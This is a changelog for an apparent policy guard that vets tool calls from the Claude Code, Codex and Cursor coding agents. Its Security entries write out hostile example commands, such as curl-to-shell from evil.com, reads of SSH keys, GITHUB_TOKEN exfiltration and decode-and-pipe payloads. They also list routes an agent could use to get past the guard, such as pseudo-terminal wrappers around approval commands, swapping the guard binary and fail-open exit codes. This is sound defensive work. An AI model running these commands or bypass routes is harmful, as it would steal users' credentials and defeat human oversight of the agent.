## [Unreleased]

### Security
- Default policy: `secrets-paths` now also covers `~/.git-credentials`, `~/.npmrc`, `~/.pypirc`, `~/.cargo/credentials(.toml)`, `~/.config/gcloud/**`, `~/.azure/**`, `~/.zsh_history` and `~/.bash_history`. Before this, reading them asked instead of being denied. `.env.example`, `.env.sample` and `.env.template` are excluded, because they are committed templates; reading one was denied before. `project-fs` now also allows reading the project root itself, so Grep and Glob with no path no longer ask.
- `destructive` denies deleting a remote branch: `git push origin :main`, `git push origin --delete main`, `git push -d origin main` and `d` bundled with other short options (`-vd`). Previously these asked (`push`).
- git global options no longer hide the subcommand: `git -C dir push --force`, `git -c core.sshCommand=… push -f`, `git --git-dir=x --work-tree=y push origin +main` and `git -C .. reset --hard` are denied by `destructive` (previously asked), and `git -C crates/x status` is allowed by `dev-shell`. A `-c`/`--config-env` key that can run a program (anything outside a short inert list such as `color.*`, `user.name`), `--exec-path=` and unknown global options keep the command at ask, so `git -c core.fsmonitor='sh -c …' status` and `git -c core.hooksPath=… commit` cannot ride on a `dev-shell` allow.
- Here-document bodies with an unquoted delimiter are expanded the way the shell expands them: `$( … )`, backticks and `$VAR` inside are classified, so `cat <<EOF` with a `$(curl https://evil.com/x.sh | sh)` or `$(cat ~/.ssh/id_rsa)` line and `curl -d @- … <<EOF` with a `$GITHUB_TOKEN` line are denied (previously allowed by `dev-shell`, or asked). A shell or interpreter reading stdin runs the body as its program, like a here-string: `bash <<'EOF'` with `cat ~/.ssh/id_rsa` is denied by `secrets-paths`, `python3 - <<'EOF'` naming a URL by `default.net`. A quoted delimiter (`<<'EOF'`, `<<"EOF"`, `<<\EOF`) keeps the body literal data.
- `destructive` denies every spelling of a force push: a `+refspec` (`git push origin +main`, `+HEAD:main`), `--force*`/`-f` after the remote (`git push origin main -f`) and `f` bundled with other short options (`git push -uf origin main`). Previously only `--force*`/`-f*` directly after `push` were denied and the rest asked (`push`).
- `kernel-self` denies more pseudo-terminal routes to `moat allow|doctor|init|policy`: `script` and `expect` by absolute path (`/usr/bin/script -q /dev/null moat doctor --accept`), `python3 -c 'import pty; pty.spawn(["moat", …])'`, `tmux new|send-keys …` and `screen -dm …` running moat, and `osascript -e 'tell app "Terminal" to do script "moat …"'`. Previously these asked while the plain forms were denied (ADR-014).
- Lexer: `<<<` here-strings are a redirect whose word is stdin data; they were read as a here-document with no terminating line, so `cat <<< hi` and `grep x <<< "$v"` were `unparseable` (ask). Substitutions and variables in the word are classified (`cat <<< "$(curl https://evil.com)"` is denied by `default.net`, `curl -d @- … <<< "$GITHUB_TOKEN"` by `env-secrets`), and a shell or interpreter reading stdin runs it as its program (`bash <<< 'cat ~/.ssh/id_rsa'` is denied by `secrets-paths`).
- Shell classification: a shell's own options are parsed, so `bash -lc '…'` (how Codex runs every command), `zsh -ic`, `sh -ec`, `/bin/bash -lc`, `bash -c -- '…'`, `bash --login -c` and `dash -o errexit -xc` classify the command string; previously only a literal `-c` argument was recognised and these asked (`default`) even when the inner command was denied, such as `bash -lc 'cat ~/.ssh/id_rsa'`. An option the classifier does not know for that shell makes the command `unparseable`. `base64 -d f | bash -o pipefail` and `bash -s arg` are recognised as reading the program from stdin (`pipe-to-shell`).
- Cursor: `preToolUse` `Grep` and `Glob` are file reads of their `path` (else the working directory), like Claude Code's; previously they were allowed as ungoverned, so a search of `~/.aws/credentials` was never checked.
- Claude Code: `Monitor` (runs a shell command, or opens a WebSocket) is governed as a shell command or a network action, `LSP` as a file read, and `PowerShell` always asks (`unparseable`; moat has no PowerShell parser, new `Action::ForeignShell`). All three were outside the hook matcher and would have been allowed as ungoverned; the matcher now includes them (re-run `moat init`; `moat doctor` reports the old matcher as stale). Conformance fixtures accept `foreign_shell: { shell, command }`.
- A glob ending in `/**` also matches the directory itself. `grep -r . ~/.ssh`, `rg -uu . ~/.aws`, `tar czf k.tgz ~/.ssh` and `rm -rf ~/.gnupg` are now denied by `secrets-paths`; before, the directory operand matched no deny rule. `ln -s ~/.ssh ./s` is now denied rather than asked.
- Relative paths follow `cd`/`pushd` in the same command line, so `cd ~ && cat .ssh/id_rsa`, `cd ~/.config && cat gh/hosts.yml` and `cd s && cat id_rsa` (through a link) are denied by `secrets-paths`; previously the relative path was taken from the session's directory and only the `cd` itself asked. Every directory the line may be in is checked; subshells restore it; an unknown target (`cd "$DIR"`, `cd -`, `popd`, `source`, `eval`) makes later relative paths ask (`unparseable`).
- Relative operands are file actions: words containing `/` for any program, and every operand of programs that read or write files (`cat`, `head`, `grep -r`, `cp`, `mv`, `rm`, `tee`, …). After `ln -s ~/.ssh s` in the project, `cat s/id_rsa`, `head s/id_rsa`, `grep -r . s/` and `cat k` (a link to a key) were allowed by `dev-shell` because they produced no `fs.read`; only `cat ./s/id_rsa` was denied. They are now resolved through the link and denied by `secrets-paths`.
- `~name` paths in shell commands are home directories: `cat ~me/.ssh/id_rsa` (your own user) is denied by `secrets-paths` and `cat ~alice/.ssh/id_rsa` is a read of `/Users/alice/.ssh/id_rsa` (the directory next to your home) that asks. Previously both were reads of `<cwd>/~me/…` inside the project and were allowed by `project-fs`. `~+` is the working directory; `~-` asks (`unparseable`).
- The project root is never the home directory, an ancestor of it or a filesystem root. A session started in `~` outside a repository used `~` as `${project}`, so `project-fs` allowed `echo x > ~/.gitconfig`, `echo x > Library/LaunchAgents/evil.plist` and every read in the home directory. Such a session now has no project: `${project}` patterns match nothing and those actions ask. A dotfiles repository in `~` no longer becomes the project of every directory below it. `EvalContext::project` is now an `Option`; conformance fixtures accept `context: { cwd, project }`.
- A glob ending in `/**` also matches the directory itself, so `grep -r . ~/.ssh`, `rg -uu . ~/.aws`, `tar czf k.tgz ~/.ssh` and `rm -rf ~/.gnupg` are denied by `secrets-paths`; previously the directory operand matched no deny rule. `ln -s ~/.ssh ./s` is now denied rather than asked.
- `moat guard` denies with exit 2 when it cannot parse its own arguments: an unknown `--host`, a missing or misspelt flag, an extra operand. It used to exit 64, and Claude Code and Codex treat any exit other than 2 as a non-blocking hook error, so a broken hook command line let every tool call through (ADR-015). Other commands keep exit 64 for usage errors.
- MCP arguments: nested objects and arrays are searched for path and URL arguments, URL arguments without a scheme are kept as hosts, and arguments that cannot be read (a Cursor `tool_input` string that is not JSON, more than 1024 derived paths and URLs) are an adapter error, so `guard` denies. Previously an unparseable string was treated as no arguments and an allowed tool name such as `mcp__filesystem__read_file` decided alone.
- State files are owner-only from creation: `write_private` creates its temporary file with mode 0600 before writing and new parent directories (such as `policy.d/`) with 0700, `moat init` tightens an existing state directory, and the audit database is created 0600 before SQLite opens it, so its `-wal` and `-shm` files inherit 0600. Previously files were written first and restricted afterwards, `policy.d/` was 0755, the WAL files followed the umask, and permission errors were ignored.
- Lexer: `|&` is a pipe. It was read as `|` followed by `&`, which ended the pipe chain, so `base64 -d payload |& sh` asked while `base64 -d payload | sh` was denied by `pipe-to-shell`.
- Host detection: a word with a scheme is a network action whatever its host looks like, so `curl http://intranet/…`, `http://2130706433/`, `http://0x7f000001/` and IPv6 literals (`http://[fd00:ec2::254]/`) are denied by `default.net`; previously a host without a dot or with an IPv6 literal produced no network atom and the command only asked. One parser (`moat_core::host`) now serves shell words, `WebFetch` and MCP arguments; IPv6 hosts are reported without brackets. New ask group `local-net` keeps `localhost`, `127.0.0.1` and `::1` at ask.
- `kernel-self` denies writes to `**/bin/moat` and `**/bin/moat.exe`, the binary every installed hook runs (`cp /tmp/evil ~/.cargo/bin/moat`, `curl -o /usr/local/bin/moat …`, `ln -sf … /opt/homebrew/bin/moat`); previously these asked. `curl -o FILE` and `wget -O FILE` / `--output-document=FILE` are now file writes. First attack fixtures for T10 (hook supply chain).
- Codex: the hook matcher is now `Bash|apply_patch|mcp__.*` (re-run `moat init`; `moat doctor` reports the old matcher as stale). `apply_patch` file edits become a new `Action::Patch { writes }` with every added, updated, deleted or moved-to file checked as `fs.write` (a patch naming no file asks), and Codex MCP calls are mapped like Claude Code's. Previously Codex file edits and MCP calls were never seen. Conformance fixtures accept `patch: [paths]`.
- Default policy: `env-poison` also denies setting `MOAT_*` variables (`MOAT_HOME` relocates the kernel's state; `MOAT_ASSUME_TTY` is a debug-build test override).
- `kernel-self` protects the state and host directories themselves (`~/.moat`, `~/.claude`, `~/.codex`, `~/.cursor`, and `.moat`/`.claude`/`.codex`/`.cursor` in projects): `mv ~/.moat /tmp/x`, `ln -sfn /tmp/evil ~/.moat`, `rm -rf ~/.claude` and `mv .claude .claude-off` are denied; previously only files inside them were protected and these asked. `mv` now treats its source as a write. The policy lock reports a pinned file as modified when a directory on its path was replaced by a link; previously the changed location was reported as intact.
- `dev-shell` no longer allows options that run another program or write files: `find -exec/-execdir/-ok/-okdir/-delete/-fprint*/-fls`, `rg --pre`, `git --upload-pack/--receive-pack`, `go -exec/-toolexec/-vettool`, `cargo --config` now ask. The command after `find -exec` is classified (so `find . -exec sh -c 'curl … evil.com' \;` is denied by `default.net`), and `--output=FILE` is a file write (so `git diff --output=~/.zshrc` is denied by `shell-rc`). Previously all of these were allowed by `dev-shell`.
- `kernel-self` denies `script`, `expect` and `unbuffer` wrapped around `moat allow|doctor|init|policy` (BSD and Linux `script` forms, `expect -c 'spawn …'`, absolute `moat` paths); they gave the command a pseudo-terminal to pass the terminal-only check and previously only asked (ADR-011).
- `pipe-to-shell` now covers decoded or decompressed content piped into any shell or interpreter reading stdin: `base64 -d file | bash`, `base64 -D`, `openssl enc -d … | sh`, `xxd -r -p x | bash`, `gunzip -c x.gz | tr … | sh`, `… | base64 --decode | python3 -`; and `curl`/`wget` output piped into `zsh`, `dash`, `ksh`, `fish`, `python*`, `node`, `perl`, `ruby`, `php`, `deno`, `bun`, `pwsh`. Previously only `base64 -d|--decode` directly followed by `sh`/`bash` with no file argument, and `curl`/`wget` into `sh`/`bash`, were denied; everything else asked.
- `moat guard` resolves symlinks in every path a tool call reads or writes and checks the resolved path as well as the literal one, strictest wins: after `ln -s ~/.ssh ./s`, `cat ./s/id_rsa`, `echo … >> s/authorized_keys` and a `Read` of `proj/s/id_rsa` are denied by `secrets-paths`; previously they were allowed by `project-fs`. New files resolve through their directory, dangling links through their target. Conformance fixtures accept `links:` (ADR-009).
- Default policy: new deny group `env-dump` for `env`, `printenv`, `set`, `export`, `declare` and `typeset` run with no arguments (or only `-0`/`-p`/`-x`), including `/usr/bin/env`; they printed every secret in the environment and only asked. `printenv NAME` is now an `env.read` of `NAME`, so `printenv GITHUB_TOKEN` is denied by `env-secrets`.

### Fixed
- CI: the fuzz smoke job failed on every run since fuzzing landed. The repository's `rust-toolchain.toml` pins 1.95, that pin also applied inside `fuzz/`, and `cargo fuzz` needs nightly `-Z` flags. `fuzz/rust-toolchain.toml` now pins the nightly for that workspace, so a plain `cargo fuzz run` works locally too.
- Claude Code `ConfigChange`: the payload current Claude Code sends (no `change_type`, `file_path` optional) is accepted; previously every real settings change, including the user's own "always allow" writes, was denied `kernel-error` with exit 2. A change that names no file is blocked only when a pinned file no longer matches the lock. A `ConfigChange` payload that cannot be parsed is now refused as `{"decision":"block"}` instead of a `PreToolUse` document.
- A command containing a backslash (`echo C:\\temp`) made `moat allow --always` write a glob with a dangling escape, so the overlay failed to lint and every following call was denied until it was edited by hand; an escaped separator word (`Z;\&;\&`) made the classifier panic (pipeline slice out of range), which `guard` turned into a deny. Both found by fuzzing. On Windows, a backslash in a shell rule word never matched, because globset rewrites `\` to `/` in every candidate; rules like a deny on `del 'C:\\Windows\\*'` were silently dead there. Shell words now match byte for byte on every platform, and a backslash escapes the next character everywhere.
- `moat policy check` decides the way `guard` does: symlinks in checked paths are resolved, and programs are resolved through the installation snapshot when `~/.moat/environment.json` exists (so policy `executables:` pins are checked against real locations instead of reporting "not found"). `moat doctor --accept` refuses to pin a policy that does not lint, and clears only lock and binary problems after re-pinning (typed checks instead of matching message prefixes).
- Audit log: an event whose stored action cannot be decoded is shown as `(action unreadable)` by `show`, `replay` and `report` (and carries `action_unreadable` in JSON) instead of looking like an ungoverned tool; verdicts are decoded through `Verdict`.
- `moat allow --always` stores the command as a literal pattern (`cat *` becomes `cat [*]`; a leading `!` or trailing `$` stays literal); previously glob characters widened the permanent rule. New overlay ids are one past the highest existing `approved-N`; previously deleting `approved-1` made the next approval reuse an existing id, the policy failed to lint and `guard` denied everything until the overlay was fixed by hand.
- `moat policy check` takes `--project` and `--cwd` as lexically absolute paths, like `guard` takes the host's `cwd`; it used to canonicalise them, so on macOS (`/tmp` → `/private/tmp`) and Windows (8.3 short names, `\\?\` prefix) a file inside the project no longer matched `${project}` rules. Windows: canonical paths no longer carry the `\\?\` verbatim prefix, so lock keys and symlink resolution stay stable; program resolution honours `PATHEXT` (recorded in `environment.json` at `moat init`; older snapshots fall back to `.com;.exe;.bat;.cmd`). Lock files written on Windows by earlier builds drift once and must be re-pinned with `moat doctor --accept`.
- Shell classification: `make`/`gmake` arguments that run code (`--eval`/`-E`, `-e`, `SHELL=`, `.SHELLFLAGS=`, `MAKEFLAGS=`, `NAME!=cmd`, `$(shell …)` in variable values) are classified on their own, so `make test SHELL=/tmp/x` and `make test --eval 'x:;cat ~/.ssh/id_rsa'` no longer pass as `make test*` (`dev-shell`); embedded commands are evaluated like any other, `--file=`/`--directory=` values are file reads.
- `moat guard` denies (`kernel-error`, exit 2) when the audit log cannot be opened or written, when the hook response cannot be written to stdout, or when the kernel itself panics; previously an unavailable log printed a warning and the call proceeded unrecorded, and a panic exited 101, which Claude Code treats as non-blocking. `guard` no longer recreates a deleted `audit.db`; only `moat init` creates it.
- Host detection: a bare dotted token without a scheme is a host only when its last label is a known top-level domain, so `python -c "import sys; print(sys.version)"`, `node -e "console.log(process.version)"` and `git commit -m fix.bug` no longer produce a network atom (and a false `default.net` deny). Tokens with a scheme and IPv4 literals are unchanged.
- Shell classification: `pnpm exec|dlx`, `yarn exec|dlx`, `npm exec|x`, `bun x`, `npx` and `bunx` are treated as wrappers, so the program they run is classified on its own (`pnpm exec sh -c '…'` parses the shell string); `-c`/`--call` strings given to package runners are parsed as shell. Previously the whole command matched the outer `pnpm *` allow rule.
- Policy lock: a pinned file replaced by a symlink (or a re-pointed link) is now reported as modified and denies with `kernel-integrity`; previously the swapped file was treated as unpinned and the kernel ran under the attacker's policy.
- Shell classification: tokens that traverse (`src/../x`) or name a hidden entry (`.env`, `config/.env.local`, `.ssh/id_rsa`) are now treated as paths, so `cat .env` and `cat src/../../.ssh/id_rsa` produce file-read atoms and hit `secrets-paths`; previously only tokens starting with `/`, `~`, `./` or `../` did and such commands were allowed by `dev-shell`.
- Audit redaction now runs on the structured action before it is JSON-encoded. Previously it ran on the encoded text, where escaped quotes broke the patterns: a command such as `curl -H "X-Api-Key: …"` was stored as invalid JSON (making `moat show`, `replay` and `report` fail for the whole window) and `export PASSWORD="…"` kept the secret. Rows with an unparsable action cell are now read with the action omitted instead of failing the query.

### Added (MCP arguments)
- `Action::McpTool` carries the paths and hosts an adapter derived from the call's arguments (`reads`, `writes`, `hosts`); the engine turns them into `fs.read`, `fs.write` and `net` atoms, so an allowed MCP tool name can no longer read `~/.aws/credentials` or fetch an unlisted host. Conformance fixtures accept `mcp_tool: { name, reads, writes, hosts }`.
- Claude Code and Cursor adapters derive those paths and hosts from MCP `tool_input` by argument name (`path`, `paths`, `file_path`, `source`, `destination`, `url`, …); write-shaped tool names (`write_*`, `edit_*`, `move_*`, `delete_*`) and `destination`/`target` arguments produce `fs.write`.

### Changed
- Fuzzing: `fuzz/` adds `cargo fuzz` targets for the command classifier, policy loader, host payload adapters and approved-command patterns, seeded from the conformance fixtures; CI runs them on every pull request and longer weekly.
- The default policy moved to `crates/moat-core/policies/default-v1.yaml` and is exported as `moat_core::DEFAULT_POLICY`. `moat-kernel` read it from outside its crate, so it could not be published; every crate now packages and builds from its tarball, and CI checks that on each PR (`cargo package --workspace`).
- Package metadata: the `moat-kernel` description no longer claims OS enforcement or OpenClaw support. It says what ships in this alpha: allow, ask or deny for Claude Code, Codex and Cursor tool calls, plus an audit log, and that it is not an OS sandbox. The `sandbox` keyword is replaced by `guardrails`. In `deny.toml`, the `tokio` and `reqwest` bans named the binary crate `moat-cli`, which does not exist (the package is `moat-kernel`). With the name fixed, the bans let only the binary crate pull those crates in, as intended.
- Policy: `approval:` and `scope:` are reserved. They were parsed but never consulted; they remain accepted so existing files stay valid, `moat policy lint` now warns that they have no effect, and the default policy no longer writes an `approval:` block.
- `moat-core` API: typed `Kind` (with `FromStr`) replaces kind strings in `AtomicAction::kind`, `Action::kind`, `Defaults::for_kind` and the new `RuleGroup::patterns`; `EvalContext::case_insensitive_paths` replaces a compile-time platform switch inside the core (the CLI sets it for macOS and Windows).
- `moat-core` API: `Verdict` implements `FromStr` (`UnknownVerdict`); `Decision::single` builds a one-rule decision. Internally one generic matcher replaces the duplicated glob and shell list matching, and one helper splits `!` exclusions.
- `moat-core` exposes only its API (`Action`, `CompiledPolicy`, `EvalContext`, `Policy`, `RuleGroup`, `Decision`, `Verdict`, the resolver traits, `lint`, `literal_shell_pattern`); the lexer, classifier, pattern, path and host modules are internal. `moat allow --always` uses `literal_shell_pattern` from the core.
- Conformance fixtures carry `threat: T1…T12` (required for attacks and asks); `docs/COVERAGE.md` is generated from them and the suite fails when it is stale or a threat class has no attack fixture.
- `moat allow` and `moat doctor --accept` success paths are covered end to end (`tests/allow.rs`): session grant via `--last` and explicit `--session`, `--always` overlay with lock re-pin, `doctor --accept` after an owner edit. Debug builds honour `MOAT_ASSUME_TTY=1` for these tests; release builds do not contain the override.
- Default policy: new allow group `dev-readonly` (`wc`, `diff`, `tree`, read-only `docker ps/images/logs/version`, `gh pr/issue/run/repo` view and list commands, reads of `PATH`, `HOME`, `USER`, `SHELL`, `PWD`, `LANG`, `TERM`, `TMPDIR`, `EDITOR`); `--output`/`-o` forms are excluded. The benign conformance corpus grows from 34 to 87 fixtures.
- Shell pattern lists accept `!` exclusions, with the same semantics as glob lists (ADR-012).
- `moat policy lint` prints warnings (exit 0) for `ask` patterns an `allow` pattern already covers, `allow` patterns a `deny` pattern covers, and unknown `defaults` kinds; `executables` paths in Windows form (`C:/…`) are accepted as absolute.
- Shell patterns: a trailing bare `$` anchors the end of argv (`env $` matches `env` but not `env FOO=1 cmd`); `$` elsewhere is literal and a pattern of only `$` fails lint (ADR-010).
- Default policy: `dev-shell` lists explicit subcommands instead of `pnpm *`, `yarn *`, `cargo *`, `make *`, so the `installs` and `push` ask rules are reachable again (`cargo add/install/publish`, `pnpm add/install`, `yarn add/install` now ask; `npx`/`dlx` ask). New `dev-tools` allow group (`tsc`, `eslint`, `prettier`, `vitest`, `jest`, `ruff`, `mypy`, …). `destructive` matches `rm -rf /*` literally (no longer every absolute path), adds `-fr` variants, `--no-preserve-root`, `git branch -D`, `git stash drop/clear`. `kernel-self` also matches `moat` run by absolute path. `secrets-paths` adds `.envrc`.

### Added
- Policy engine: schema v1 with `deny → allow → ask → defaults` evaluation, per-kind defaults, absolute deny, strictest-wins across atomic actions.
- Shell classification: POSIX lexer (quotes, escapes, redirects, `$(…)`, backticks, here-documents), sub-commands, subshells, `eval`, `sh -c`, wrappers, inline interpreters, environment reads/sets, path and host extraction.
- Host adapters for Claude Code and Codex `PreToolUse` hooks, and for Cursor (`beforeShellExecution`, `beforeMCPExecution`, `beforeReadFile`, `preToolUse`; `moat init` writes a fail-closed `~/.cursor/hooks.json`).
- Audit log in SQLite (WAL) with credential redaction; time-window and per-session queries (`since`, `sessions_since`, `summary`); `moat show [id | --session | --since | --recent]`, `moat replay` (per-session timeline, `--since`/`--session`/`--host`) and `moat report` (verdict totals, hosts, top rules, asks per active hour). Windows accept `all`, `today`, `yesterday`, `12h`, `7d`, `2w` or `YYYY-MM-DD`.
- `moat status` exits 64 when the installation is unhealthy (missing policy, lock drift, broken hook, missing audit log) so scripts can test it.
- `moat init` (policy, audit log, idempotent hook installation), `moat guard` (fail-closed), `moat policy lint|check`.
- Default policy v1 and 95 conformance fixtures (63 attacks, 20 benign, 12 ask).
- Host configuration directories can be overridden for tests and unusual installs: `CLAUDE_CONFIG_DIR`, `CODEX_HOME`, `CURSOR_CONFIG_DIR`; state directory via `MOAT_HOME`.

### Added (self-protection)
- `policy.lock`: `moat init` pins SHA-256 digests of the policy and every installed host hook file; `moat guard` verifies them on every call and denies everything with rule `kernel-integrity` when a pinned file changed or disappeared.
- `moat status` reports lock state; re-running `moat init` re-pins.
- Claude Code `ConfigChange` hook: when a settings file pinned by the lock is edited or deleted outside `moat`, the change is refused for the running session (rule `kernel-integrity`); unpinned settings files load and are audited.
- Executable pinning: `moat init` snapshots the search path and the location of common programs in `~/.moat/environment.json` (pinned by the lock); `moat guard` resolves every shell command's program through the snapshot and denies pinned programs that resolve elsewhere (rule `executables`). Policy `executables:` pins are now enforced.
- Approvals: `moat allow --last` (or `moat allow <command> --host … --session …`) grants one exact command to one host session; `moat allow … --always` appends a permanent allow rule to `~/.moat/policy.d/approved.yaml`, merged into the policy at load. Both files are pinned by the lock; `moat allow` is terminal-only and denied to agents by the default policy.
- `moat doctor [--accept]`: verifies state directory, policy, lock, hooks, binary path and audit log; `--accept` re-pins and is refused outside an interactive terminal.

### Changed
- Project standards: `AGENTS.md` contract, CONTRIBUTING, SECURITY, Code of Conduct, pinned-SHA workflows, Conventional Commits PR titles, Dependabot, CODEOWNERS, issue forms, PR template, single quality-gate script, clippy thresholds, rustdoc `-D warnings`, architecture tests, ADR-001…004.
- CI: `pr-standards` applies `type:`/`area:`/`size:`/`risk:` labels from the title and changed paths, fails PRs over 500 lines (unless `size: override`) or without Testing and Security impact sections; labels are defined in `scripts/ci/sync-labels.sh`.

- Windows: canonical slash-separated paths keep `C:/` and UNC roots.

### Security
- Exit code 2 is reserved for `deny`; usage errors use 64 so a host never mistakes a crash for a block.
- Secret paths are protected against writes as well as reads.
